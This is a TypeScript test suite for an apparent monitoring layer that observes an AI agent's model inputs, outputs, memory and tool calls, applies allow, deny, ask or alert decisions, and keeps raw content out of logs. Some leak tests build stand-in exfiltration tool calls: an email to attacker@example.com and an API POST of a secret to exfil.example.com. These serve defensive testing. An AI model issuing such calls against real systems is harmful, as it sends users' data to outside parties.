import assert from "node:assert/strict";
import test from "node:test";

import {
  ObservedMonitoredSession,
  Track1MonitorError
} from "../src/monitoring/index.ts";
import {
  makeDeterministicMonitorPorts,
  makeObservedModelInput,
  makeObservedModelOutput,
  makeObservedSessionContext,
  makeObservedSession,
  makeObservedToolRequest,
  makeObservedToolResult,
  makeReadyObservedSession
} from "./fixtures/observed-monitor.fixture.ts";

// -- plan-provided canonical stream test ----------------------------------

test("REQ-T1-DEMO-010 split model hooks form one canonical event stream", async () => {
  const seen: unknown[] = [];
  const session = new ObservedMonitoredSession(
    makeObservedSessionContext(),
    {
      decide(input) {
        seen.push(input);
        return {
          policy_id: "policy://track1/base-filter/v1",
          action: "allow",
          reason_code: "base_filter_no_match",
          reason: "No base filter rule matched",
          evidence_refs: ["evidence://track1/base-filter/no-match"]
        };
      }
    },
    makeDeterministicMonitorPorts()
  );

  session.observeModelInput(makeObservedModelInput());
  const outcome = await session.observeModelOutput(makeObservedModelOutput());
  const result = session.finalize();

  assert.equal(outcome.decision.action, "allow");
  assert.deepEqual(
    result.details.events.map((event) => event.event_type),
    ["model_input", "model_output", "policy_decision"]
  );
  assert.equal(seen.length, 1);
  assert.deepEqual(Object.keys(seen[0] as object).sort(), [
    "model_input",
    "model_output",
    "session",
    "stage",
    "subject_event_id"
  ]);
});

// -- plan-provided rejection test -----------------------------------------

test("REQ-T1-DEMO-010 split model hooks reject missing duplicate and cross-session observations", async () => {
  const cases: Array<() => void | Promise<unknown>> = [
    () => {
      const session = makeObservedSession();
      return session.observeModelOutput(makeObservedModelOutput());
    },
    () => {
      const session = makeObservedSession();
      session.observeModelInput(makeObservedModelInput());
      session.observeModelInput(makeObservedModelInput());
    },
    async () => {
      const session = makeObservedSession();
      session.observeModelInput(makeObservedModelInput());
      await session.observeModelOutput({
        ...makeObservedModelOutput(),
        session_id: "session:track1:foreign"
      });
    }
  ];

  for (const run of cases) {
    await assert.rejects(
      async () => run(),
      (error: unknown) =>
        error instanceof Track1MonitorError &&
        error.code === "monitor_state_invalid"
    );
  }
});

// -- table-driven: output before input seals session ----------------------

test("REQ-T1-DEMO-010 output before input rejects and seals the session", async () => {
  const session = makeObservedSession();
  await assert.rejects(
    () => session.observeModelOutput(makeObservedModelOutput()),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
  // Session is sealed: further observations fail
  await assert.rejects(
    () => session.observeModelOutput(makeObservedModelOutput()),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
});

// -- table-driven: second input while pair pending seals session ----------

test("REQ-T1-DEMO-010 second input while pair pending rejects and seals", () => {
  const session = makeObservedSession();
  session.observeModelInput(makeObservedModelInput());
  assert.throws(
    () => session.observeModelInput(makeObservedModelInput()),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
  // Sealed: finalize should also be rejected
  assert.throws(
    () => session.finalize(),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
});

// -- table-driven: duplicate output seals session -------------------------

test("REQ-T1-DEMO-010 duplicate output rejects and seals the session", async () => {
  const session = makeObservedSession();
  session.observeModelInput(makeObservedModelInput());
  await session.observeModelOutput(makeObservedModelOutput());
  await assert.rejects(
    () => session.observeModelOutput(makeObservedModelOutput()),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
});

// -- table-driven: mismatched session_id seals session --------------------

test("REQ-T1-DEMO-010 mismatched session_id on output rejects and seals", async () => {
  const session = makeObservedSession();
  session.observeModelInput(makeObservedModelInput());
  await assert.rejects(
    () =>
      session.observeModelOutput({
        ...makeObservedModelOutput(),
        session_id: "session:track1:foreign"
      }),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
});

// -- table-driven: malformed input/output uses safe error taxonomy -------

test("REQ-T1-DEMO-010 malformed model input is rejected with safe taxonomy", () => {
  const sentinel = "MALFORMED_INPUT_SENTINEL_4f2a";
  const session = makeObservedSession();
  assert.throws(
    () =>
      session.observeModelInput({
        session_id: makeObservedSessionContext().session_id,
        content: sentinel,
        content_ref: "not-a-valid-ref"
      }),
    (error: unknown) => {
      assert.ok(error instanceof Track1MonitorError);
      assert.equal(String(error).includes(sentinel), false);
      return true;
    }
  );
});

test("REQ-T1-DEMO-010 malformed model output is rejected with safe taxonomy", async () => {
  const sentinel = "MALFORMED_OUTPUT_SENTINEL_9c1e";
  const session = makeObservedSession();
  session.observeModelInput(makeObservedModelInput());
  await assert.rejects(
    () =>
      session.observeModelOutput({
        session_id: makeObservedSessionContext().session_id,
        content: "",
        content_ref: sentinel
      }),
    (error: unknown) => {
      assert.ok(error instanceof Track1MonitorError);
      assert.equal(String(error).includes(sentinel), false);
      return true;
    }
  );
});

// -- table-driven: provider input has no fixture-only fields --------------

test("REQ-T1-DEMO-010 provider input model_input excludes session_id and injected fields", async () => {
  let captured: { model_input: unknown; model_output: unknown } | null = null;
  const session = new ObservedMonitoredSession(
    makeObservedSessionContext(),
    {
      decide(input) {
        captured = {
          model_input: input.model_input,
          model_output: input.model_output
        };
        return {
          policy_id: "policy://track1/base-filter/v1",
          action: "allow",
          reason_code: "base_filter_no_match",
          reason: "No base filter rule matched",
          evidence_refs: ["evidence://track1/base-filter/no-match"]
        };
      }
    },
    makeDeterministicMonitorPorts()
  );

  session.observeModelInput(makeObservedModelInput());
  await session.observeModelOutput(makeObservedModelOutput());

  assert.ok(captured);
  assert.deepEqual(
    Object.keys(captured!.model_input as object).sort(),
    ["content", "content_ref"]
  );
  assert.deepEqual(
    Object.keys(captured!.model_output as object).sort(),
    ["content", "content_ref"]
  );
});

// -- table-driven: input/output mutation after call leaves refs unchanged -

test("REQ-T1-DEMO-010 input mutated after observeModelInput does not change recorded hash", async () => {
  const session = new ObservedMonitoredSession(
    makeObservedSessionContext(),
    {
      decide() {
        return {
          policy_id: "policy://track1/base-filter/v1",
          action: "allow",
          reason_code: "base_filter_no_match",
          reason: "No base filter rule matched",
          evidence_refs: ["evidence://track1/base-filter/no-match"]
        };
      }
    },
    makeDeterministicMonitorPorts()
  );

  const input = makeObservedModelInput();
  session.observeModelInput(input);
  // Mutate the original object after the call
  input.content = "MUTATED_CONTENT_SENTINEL_3b7d";
  input.content_ref = "model://mutated/ref";

  await session.observeModelOutput(makeObservedModelOutput());
  const result = session.finalize();

  const serialized = JSON.stringify(result);
  assert.equal(serialized.includes("MUTATED_CONTENT_SENTINEL_3b7d"), false);
  assert.equal(serialized.includes("model://mutated/ref"), false);
  // The recorded content_ref should be the original
  const inputEvent = result.details.events.find(
    (e) => e.event_type === "model_input"
  );
  assert.equal(
    (inputEvent?.payload as { content_ref: string }).content_ref,
    "model://track1/observed/input/001"
  );
});

test("REQ-T1-DEMO-010 output mutated after observeModelOutput does not change recorded hash", async () => {
  const session = new ObservedMonitoredSession(
    makeObservedSessionContext(),
    {
      decide() {
        return {
          policy_id: "policy://track1/base-filter/v1",
          action: "allow",
          reason_code: "base_filter_no_match",
          reason: "No base filter rule matched",
          evidence_refs: ["evidence://track1/base-filter/no-match"]
        };
      }
    },
    makeDeterministicMonitorPorts()
  );

  session.observeModelInput(makeObservedModelInput());
  const output = makeObservedModelOutput();
  await session.observeModelOutput(output);
  // Mutate the original object after the call
  output.content = "OUTPUT_MUTATION_SENTINEL_5e2c";
  output.content_ref = "model://mutated/output";

  const result = session.finalize();
  const serialized = JSON.stringify(result);
  assert.equal(serialized.includes("OUTPUT_MUTATION_SENTINEL_5e2c"), false);
  assert.equal(serialized.includes("model://mutated/output"), false);
});

// -- table-driven: output/provider failure clears volatile context --------

test("REQ-T1-DEMO-010 provider failure after pending input clears volatile context and omits sentinel", async () => {
  const sentinel = "PENDING_INPUT_SENTINEL_a1b2";
  const session = new ObservedMonitoredSession(
    makeObservedSessionContext(),
    {
      decide() {
        throw new Error(`provider failure containing ${sentinel}`);
      }
    },
    makeDeterministicMonitorPorts()
  );

  session.observeModelInput({
    session_id: makeObservedSessionContext().session_id,
    content: sentinel,
    content_ref: "model://track1/observed/input/002"
  });

  await assert.rejects(
    () => session.observeModelOutput(makeObservedModelOutput()),
    (error: unknown) => {
      assert.ok(error instanceof Track1MonitorError);
      assert.equal(String(error).includes(sentinel), false);
      return true;
    }
  );

  // Sealed after failure: finalize is rejected
  assert.throws(
    () => session.finalize(),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
});

// -- table-driven: next model pair clears previous volatile pair ----------

test("REQ-T1-DEMO-010 next model pair without tool call clears previous volatile pair", async () => {
  const seen: unknown[] = [];
  const session = new ObservedMonitoredSession(
    makeObservedSessionContext(),
    {
      decide(input) {
        seen.push({
          input_content_ref: (input.model_input as { content_ref: string })
            .content_ref,
          output_content_ref: (input.model_output as { content_ref: string })
            .content_ref
        });
        return {
          policy_id: "policy://track1/base-filter/v1",
          action: "allow",
          reason_code: "base_filter_no_match",
          reason: "No base filter rule matched",
          evidence_refs: ["evidence://track1/base-filter/no-match"]
        };
      }
    },
    makeDeterministicMonitorPorts()
  );

  // Pair 1
  session.observeModelInput(makeObservedModelInput());
  await session.observeModelOutput(makeObservedModelOutput());

  // Pair 2 — previous pair should be cleared before replacement
  session.observeModelInput({
    session_id: makeObservedSessionContext().session_id,
    content: "Second model input content",
    content_ref: "model://track1/observed/input/002"
  });
  await session.observeModelOutput({
    session_id: makeObservedSessionContext().session_id,
    content: "Second model output content",
    content_ref: "model://track1/observed/output/002"
  });

  const result = session.finalize();
  assert.equal(seen.length, 2);
  // Second provider call must see the second pair, not the first
  assert.equal(seen[1]!.input_content_ref, "model://track1/observed/input/002");
  assert.equal(
    seen[1]!.output_content_ref,
    "model://track1/observed/output/002"
  );
  // Both pairs recorded as events
  const inputEvents = result.details.events.filter(
    (e) => e.event_type === "model_input"
  );
  assert.equal(inputEvents.length, 2);
});

// -- table-driven: finalize failure clears volatile context ---------------

test("REQ-T1-DEMO-010 finalize on empty session rejects and seals", () => {
  const session = makeObservedSession();
  assert.throws(
    () => session.finalize(),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      (error.code === "monitor_session_empty" ||
        error.code === "monitor_state_invalid")
  );
  // After failed finalize, session is sealed
  assert.throws(
    () => session.observeModelInput(makeObservedModelInput()),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
});

// -- table-driven: call after finalize() ----------------------------------

test("REQ-T1-DEMO-010 observeModelInput after finalize rejects with monitor_state_invalid", async () => {
  const session = makeObservedSession();
  session.observeModelInput(makeObservedModelInput());
  await session.observeModelOutput(makeObservedModelOutput());
  session.finalize();

  assert.throws(
    () => session.observeModelInput(makeObservedModelInput()),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
  await assert.rejects(
    () => session.observeModelOutput(makeObservedModelOutput()),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
});

// -- volatile pair cleared on finalize ------------------------------------

test("REQ-T1-DEMO-010 finalized session result contains only refs hashes and decisions", async () => {
  const inputSentinel = "INPUT_BODY_SENTINEL_d17a";
  const outputSentinel = "OUTPUT_BODY_SENTINEL_e8f3";
  const session = new ObservedMonitoredSession(
    makeObservedSessionContext(),
    {
      decide() {
        return {
          policy_id: "policy://track1/base-filter/v1",
          action: "allow",
          reason_code: "base_filter_no_match",
          reason: "No base filter rule matched",
          evidence_refs: ["evidence://track1/base-filter/no-match"]
        };
      }
    },
    makeDeterministicMonitorPorts()
  );

  session.observeModelInput({
    session_id: makeObservedSessionContext().session_id,
    content: inputSentinel,
    content_ref: "model://track1/observed/input/003"
  });
  await session.observeModelOutput({
    session_id: makeObservedSessionContext().session_id,
    content: outputSentinel,
    content_ref: "model://track1/observed/output/003"
  });

  const result = session.finalize();
  const serialized = JSON.stringify(result);
  assert.equal(serialized.includes(inputSentinel), false);
  assert.equal(serialized.includes(outputSentinel), false);
});

// -- outcome shape ---------------------------------------------------------

test("REQ-T1-DEMO-010 observeModelOutput returns decision response and can_continue", async () => {
  const session = new ObservedMonitoredSession(
    makeObservedSessionContext(),
    {
      decide() {
        return {
          policy_id: "policy://track1/base-filter/v1",
          action: "allow",
          reason_code: "base_filter_no_match",
          reason: "No base filter rule matched",
          evidence_refs: ["evidence://track1/base-filter/no-match"]
        };
      }
    },
    makeDeterministicMonitorPorts()
  );

  session.observeModelInput(makeObservedModelInput());
  const outcome = await session.observeModelOutput(makeObservedModelOutput());

  assert.ok(outcome.response);
  assert.ok(outcome.decision);
  assert.equal(outcome.decision.action, "allow");
  assert.equal(outcome.can_continue, true);
  assert.deepEqual(
    Object.keys(outcome.response).sort(),
    ["content", "content_ref"]
  );
});

// -- deny decision seals session after model output -----------------------

test("REQ-T1-DEMO-010 deny at model output seals the session", async () => {
  const session = new ObservedMonitoredSession(
    makeObservedSessionContext(),
    {
      decide() {
        return {
          policy_id: "policy://track1/test-deny",
          action: "deny",
          reason_code: "test_deny",
          reason: "Test deny action",
          evidence_refs: ["evidence://track1/test-deny"]
        };
      }
    },
    makeDeterministicMonitorPorts()
  );

  session.observeModelInput(makeObservedModelInput());
  const outcome = await session.observeModelOutput(makeObservedModelOutput());
  assert.equal(outcome.decision.action, "deny");
  assert.equal(outcome.can_continue, false);

  // Sealed: further input rejected
  assert.throws(
    () => session.observeModelInput(makeObservedModelInput()),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
});

// =========================================================================
// P3-T2: Two-Phase Tool Observation Lifecycle
// =========================================================================

test("REQ-T1-DEMO-010 deny and ask intercept before an OpenClaw tool can execute", async () => {
  for (const action of ["deny", "ask"] as const) {
    const session = await makeReadyObservedSession(action);
    const outcome = await session.beforeTool(makeObservedToolRequest());
    const result = session.finalize();
    const monitor = result.metadata!.monitor as Record<string, unknown>;

    assert.equal(outcome.disposition, "intercept");
    assert.equal(outcome.decision.action, action);
    assert.equal(
      result.details.events!.filter((event) => event.event_type === "tool_result").length,
      1
    );
    assert.equal(monitor.executed_tool_count, 0);
    assert.equal(monitor.intercepted_tool_count, 1);
  }
});

test("REQ-T1-DEMO-010 allow waits for one correlated after-tool observation", async () => {
  const session = await makeReadyObservedSession("allow");
  const before = await session.beforeTool(makeObservedToolRequest());
  assert.equal(before.disposition, "execute");

  await assert.rejects(
    () => session.beforeTool(makeObservedToolRequest({ call_id: "call:second" })),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );

  const snapshot = session.afterTool(makeObservedToolResult());
  const monitor = snapshot.metadata!.monitor as Record<string, unknown>;
  assert.equal(monitor.executed_tool_count, 1);
  assert.deepEqual(
    snapshot.details.events!.slice(-3).map((event) => event.event_type),
    ["tool_request", "policy_decision", "tool_result"]
  );
});

test("REQ-T1-DEMO-010 after-tool correlation mismatch fails closed", async () => {
  const session = await makeReadyObservedSession("allow");
  await session.beforeTool(makeObservedToolRequest());

  assert.throws(
    () => session.afterTool({
      ...makeObservedToolResult(),
      call_id: "call:foreign"
    }),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_tool_failed"
  );
  const failed = session.snapshot();
  assert.equal(failed.status, "failed");
  assert.equal(
    JSON.stringify(failed).includes("call:foreign"),
    false
  );
});

test("REQ-T1-DEMO-010 controlled memory observations retain refs and hashes only", async () => {
  const session = await makeReadyObservedSession("allow");
  const sentinel = "CONTROLLED_MEMORY_SENTINEL_8ac1";
  session.observeMemoryWrite({
    session_id: makeObservedSessionContext().session_id,
    memory_entry_id: "memory:synthetic:001",
    content: sentinel,
    content_ref: "memory://track1/synthetic/001"
  });
  const snapshot = session.observeMemoryRead({
    session_id: makeObservedSessionContext().session_id,
    memory_entry_id: "memory:synthetic:001",
    content: sentinel,
    content_ref: "memory://track1/synthetic/001"
  });
  assert.deepEqual(
    snapshot.details.events.slice(-2).map((event) => event.event_type),
    ["memory_write", "memory_read"]
  );
  assert.equal(JSON.stringify(snapshot).includes(sentinel), false);
});

// -- table-driven: tool before completed model pair fails closed -----------

test("REQ-T1-DEMO-010 tool before completed model pair fails closed", async () => {
  const session = makeObservedSession();
  await assert.rejects(
    () => session.beforeTool(makeObservedToolRequest()),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
});

// -- table-driven: malformed arguments or unsafe ref -----------------------

test("REQ-T1-DEMO-010 malformed tool request fails closed", async () => {
  const session = await makeReadyObservedSession("allow");
  await assert.rejects(
    () => session.beforeTool({ malformed: true }),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      (error.code === "monitor_tool_request_invalid" ||
        error.code === "monitor_state_invalid")
  );
});

// -- table-driven: provider throws -----------------------------------------

test("REQ-T1-DEMO-010 provider throws at tool stage fails closed with no raw error", async () => {
  const sentinel = "PROVIDER_THROW_SENTINEL_b3c4";
  const session = new ObservedMonitoredSession(
    makeObservedSessionContext(),
    {
      decide() {
        throw new Error(`provider boom ${sentinel}`);
      }
    },
    makeDeterministicMonitorPorts()
  );
  session.observeModelInput(makeObservedModelInput());
  // Model output will fail-closed already; we need a provider that only throws at tool stage
  // For this test we use a provider that throws always but check sentinel absence
  await assert.rejects(
    () => session.observeModelOutput(makeObservedModelOutput()),
    (error: unknown) => {
      assert.ok(error instanceof Track1MonitorError);
      assert.equal(String(error).includes(sentinel), false);
      return true;
    }
  );
});

// -- table-driven: allow without afterTool then finalize ------------------

test("REQ-T1-DEMO-010 allow without afterTool then finalize rejects incomplete session", async () => {
  const session = await makeReadyObservedSession("allow");
  await session.beforeTool(makeObservedToolRequest());
  assert.throws(
    () => session.finalize(),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
});

// -- table-driven: afterTool after deny/ask --------------------------------

test("REQ-T1-DEMO-010 afterTool after deny is rejected", async () => {
  const session = await makeReadyObservedSession("deny");
  await session.beforeTool(makeObservedToolRequest());
  assert.throws(
    () => session.afterTool(makeObservedToolResult()),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
});

// -- table-driven: duplicate afterTool -------------------------------------

test("REQ-T1-DEMO-010 duplicate afterTool is rejected", async () => {
  const session = await makeReadyObservedSession("allow");
  await session.beforeTool(makeObservedToolRequest());
  session.afterTool(makeObservedToolResult());
  assert.throws(
    () => session.afterTool(makeObservedToolResult()),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
});

// -- table-driven: wrong session/tool/call ---------------------------------

test("REQ-T1-DEMO-010 beforeTool with wrong session_id is rejected and seals", async () => {
  const session = await makeReadyObservedSession("allow");
  await assert.rejects(
    () => session.beforeTool({
      ...makeObservedToolRequest(),
      session_id: "session:track1:foreign"
    }),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_tool_request_invalid"
  );
  // Session sealed
  assert.throws(
    () => session.finalize(),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
});

// -- table-driven: callback mutates original request after beforeTool ------

test("REQ-T1-DEMO-010 request mutated after beforeTool does not change snapshot", async () => {
  const session = await makeReadyObservedSession("allow");
  const request = makeObservedToolRequest();
  await session.beforeTool(request);
  // Mutate original
  request.arguments = { path: "MUTATED_PATH", content: "MUTATED_CONTENT" };

  const snapshot = session.afterTool(makeObservedToolResult());
  const serialized = JSON.stringify(snapshot);
  assert.equal(serialized.includes("MUTATED_PATH"), false);
  assert.equal(serialized.includes("MUTATED_CONTENT"), false);
});

// -- table-driven: result object contains sentinel extra field ------------

test("REQ-T1-DEMO-010 result with sentinel extra field is absent from snapshot", async () => {
  const session = await makeReadyObservedSession("allow");
  await session.beforeTool(makeObservedToolRequest());
  const sentinel = "RESULT_SENTINEL_d5e6";
  const snapshot = session.afterTool({
    ...makeObservedToolResult(),
    // @ts-expect-error intentional extra field
    extra_secret: sentinel
  } as unknown as ReturnType<typeof makeObservedToolResult>);
  assert.equal(JSON.stringify(snapshot).includes(sentinel), false);
});

// -- snapshot is non-terminal and content-free -----------------------------

test("REQ-T1-DEMO-010 snapshot is non-terminal and does not finalize", async () => {
  const session = await makeReadyObservedSession("allow");
  await session.beforeTool(makeObservedToolRequest());
  const snap1 = session.snapshot();
  const snap2 = session.snapshot();
  // Can keep operating after snapshot
  assert.equal(snap1.status, "running");
  assert.equal(snap2.status, "running");
  session.afterTool(makeObservedToolResult());
  const final = session.finalize();
  assert.equal(final.status === "finished" || final.status === "blocked", true);
});

// -- alert action executes --------------------------------------------------

test("REQ-T1-DEMO-010 alert action executes and emits alert", async () => {
  const session = await makeReadyObservedSession("alert");
  const before = await session.beforeTool(makeObservedToolRequest());
  assert.equal(before.disposition, "execute");
  assert.equal(before.decision.action, "alert");

  const snapshot = session.afterTool(makeObservedToolResult());
  const monitor = snapshot.metadata!.monitor as Record<string, unknown>;
  assert.equal(monitor.executed_tool_count, 1);
  assert.ok(snapshot.details.alerts!.length > 0);
});

// -- P1-Fix9: content boundary — raw tool params in leak detection ----------

test("REQ-T1-DEMO-010 proposal echoing raw write_file content argument is rejected", async () => {
  const rawContent = "RAW_WRITE_FILE_CONTENT_SENTINEL_a1b2";
  const session = new ObservedMonitoredSession(
    makeObservedSessionContext(),
    {
      decide(input) {
        // At model_output stage, return a clean allow (no tool args exist yet).
        // At tool_request stage, return the leak-attempt proposal.
        if (input.stage === "tool_request") {
          return {
            policy_id: "policy://track1/leak-attempt/v1",
            action: "allow",
            reason_code: "leak_attempt",
            reason: `Captured tool content: ${rawContent}`,
            evidence_refs: ["evidence://track1/leak-attempt"]
          };
        }
        return {
          policy_id: "policy://track1/base-filter/v1",
          action: "allow",
          reason_code: "base_filter_no_match",
          reason: "No base filter rule matched",
          evidence_refs: ["evidence://track1/base-filter/no-match"]
        };
      }
    },
    makeDeterministicMonitorPorts()
  );
  session.observeModelInput(makeObservedModelInput());
  await session.observeModelOutput(makeObservedModelOutput());

  await assert.rejects(
    () => session.beforeTool({
      call_id: "call:track1:leak-001",
      session_id: makeObservedSessionContext().session_id,
      scenario_id: "T1-SC-001",
      case_id: "T1-SC-001-C001",
      tool_name: "write_file",
      arguments: {
        path: "sandbox://track1/virtual/leak.txt",
        content: rawContent
      }
    }),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_tool_failed"
  );

  const failed = session.snapshot();
  assert.equal(failed.status, "failed");
  assert.equal(
    JSON.stringify(failed).includes(rawContent),
    false,
    "raw tool argument must not leak into snapshot"
  );
});

test("REQ-T1-DEMO-010 proposal echoing raw send_email body argument is rejected", async () => {
  const rawBody = "RAW_EMAIL_BODY_SENTINEL_c3d4";
  const session = new ObservedMonitoredSession(
    makeObservedSessionContext(),
    {
      decide(input) {
        if (input.stage === "tool_request") {
          return {
            policy_id: "policy://track1/leak-attempt/v1",
            action: "allow",
            reason_code: "leak_attempt",
            reason: `Email body captured: ${rawBody}`,
            evidence_refs: ["evidence://track1/leak-attempt"]
          };
        }
        return {
          policy_id: "policy://track1/base-filter/v1",
          action: "allow",
          reason_code: "base_filter_no_match",
          reason: "No base filter rule matched",
          evidence_refs: ["evidence://track1/base-filter/no-match"]
        };
      }
    },
    makeDeterministicMonitorPorts()
  );
  session.observeModelInput(makeObservedModelInput());
  await session.observeModelOutput(makeObservedModelOutput());

  await assert.rejects(
    () => session.beforeTool({
      call_id: "call:track1:leak-002",
      session_id: makeObservedSessionContext().session_id,
      scenario_id: "T1-SC-001",
      case_id: "T1-SC-001-C001",
      tool_name: "send_email",
      arguments: {
        recipient: "attacker@example.com",
        subject: "exfil",
        body: rawBody
      }
    }),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_tool_failed"
  );

  const failed = session.snapshot();
  assert.equal(failed.status, "failed");
  assert.equal(
    JSON.stringify(failed).includes(rawBody),
    false,
    "raw email body must not leak into snapshot"
  );
});

test("REQ-T1-DEMO-010 proposal echoing raw call_api body values is rejected", async () => {
  const rawApiValue = "RAW_API_BODY_VALUE_SENTINEL_e5f6";
  const session = new ObservedMonitoredSession(
    makeObservedSessionContext(),
    {
      decide(input) {
        if (input.stage === "tool_request") {
          return {
            policy_id: "policy://track1/leak-attempt/v1",
            action: "allow",
            reason_code: "leak_attempt",
            reason: `API body value: ${rawApiValue}`,
            evidence_refs: ["evidence://track1/leak-attempt"]
          };
        }
        return {
          policy_id: "policy://track1/base-filter/v1",
          action: "allow",
          reason_code: "base_filter_no_match",
          reason: "No base filter rule matched",
          evidence_refs: ["evidence://track1/base-filter/no-match"]
        };
      }
    },
    makeDeterministicMonitorPorts()
  );
  session.observeModelInput(makeObservedModelInput());
  await session.observeModelOutput(makeObservedModelOutput());

  await assert.rejects(
    () => session.beforeTool({
      call_id: "call:track1:leak-003",
      session_id: makeObservedSessionContext().session_id,
      scenario_id: "T1-SC-001",
      case_id: "T1-SC-001-C001",
      tool_name: "call_api",
      arguments: {
        endpoint: "https://exfil.example.com",
        method: "POST",
        body: { secret: rawApiValue }
      }
    }),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_tool_failed"
  );
});

// -- P1-Fix9: content boundary — envelope content_sha256 in memory obs ------

test("REQ-T1-DEMO-010 memory observation uses envelope content_sha256 when provided", async () => {
  const session = await makeReadyObservedSession("allow");
  const sentinel = "ENVELOPE_SHA256_SENTINEL_9d8e";
  const envelopeSha256 = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2";
  session.observeMemoryWrite({
    session_id: makeObservedSessionContext().session_id,
    memory_entry_id: "memory:synthetic:envelope-001",
    content: sentinel,
    content_ref: "memory://track1/synthetic/envelope-001",
    content_sha256: envelopeSha256
  });
  const snapshot = session.observeMemoryRead({
    session_id: makeObservedSessionContext().session_id,
    memory_entry_id: "memory:synthetic:envelope-001",
    content: sentinel,
    content_ref: "memory://track1/synthetic/envelope-001",
    content_sha256: envelopeSha256
  });

  // The memory event payload must carry the envelope-provided sha256, not a re-hash
  const memoryWriteEvent = snapshot.details.events.find(
    (e) => e.event_type === "memory_write"
  );
  assert.ok(memoryWriteEvent, "memory_write event must exist");
  const writePayload = memoryWriteEvent.payload as { content_sha256: string };
  assert.equal(
    writePayload.content_sha256,
    envelopeSha256,
    "must use envelope content_sha256, not re-hash of content"
  );

  // Raw content must not leak
  assert.equal(
    JSON.stringify(snapshot).includes(sentinel),
    false,
    "raw content must not leak into snapshot"
  );
});

test("REQ-T1-DEMO-010 memory observation falls back to re-hashing when envelope content_sha256 absent", async () => {
  const session = await makeReadyObservedSession("allow");
  const sentinel = "FALLBACK_REHASH_SENTINEL_7c6b";
  session.observeMemoryWrite({
    session_id: makeObservedSessionContext().session_id,
    memory_entry_id: "memory:synthetic:fallback-001",
    content: sentinel,
    content_ref: "memory://track1/synthetic/fallback-001"
  });
  const snapshot = session.observeMemoryRead({
    session_id: makeObservedSessionContext().session_id,
    memory_entry_id: "memory:synthetic:fallback-001",
    content: sentinel,
    content_ref: "memory://track1/synthetic/fallback-001"
  });

  const memoryWriteEvent = snapshot.details.events.find(
    (e) => e.event_type === "memory_write"
  );
  assert.ok(memoryWriteEvent, "memory_write event must exist");
  const writePayload = memoryWriteEvent.payload as { content_sha256: string };
  // Must be a 64-hex sha256 (re-hashed fallback)
  assert.match(
    writePayload.content_sha256,
    /^[a-f0-9]{64}$/,
    "fallback must produce a valid sha256 hex"
  );
  // Must NOT equal a hash of empty string (sanity)
  assert.notEqual(writePayload.content_sha256, "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
});

test("REQ-T1-DEMO-010 memory observation rejects malformed envelope content_sha256", async () => {
  const session = await makeReadyObservedSession("allow");
  assert.throws(
    () => session.observeMemoryWrite({
      session_id: makeObservedSessionContext().session_id,
      memory_entry_id: "memory:synthetic:bad-001",
      content: "content",
      content_ref: "memory://track1/synthetic/bad-001",
      content_sha256: "not-a-valid-sha256"
    }),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_model_request_invalid"
  );
});

test("REQ-T1-DEMO-010 external runtime failure produces a terminal failed result", async () => {
  const session = await makeReadyObservedSession("allow");

  const failed = session.fail();

  assert.equal(failed.status, "failed");
  assert.equal(failed.summary, "Monitored sandbox session failed");
  assert.equal(typeof failed.finished_at, "string");
  assert.throws(
    () => session.observeModelInput(makeObservedModelInput()),
    (error: unknown) =>
      error instanceof Track1MonitorError &&
      error.code === "monitor_state_invalid"
  );
});

test("REQ-T1-DEMO-010 external runtime failure overrides an intercept-sealed state", async () => {
  const session = await makeReadyObservedSession("deny");
  const outcome = await session.beforeTool(makeObservedToolRequest());
  assert.equal(outcome.disposition, "intercept");

  const failed = session.fail();

  assert.equal(failed.status, "failed");
  assert.equal(failed.summary, "Monitored sandbox session failed");
});
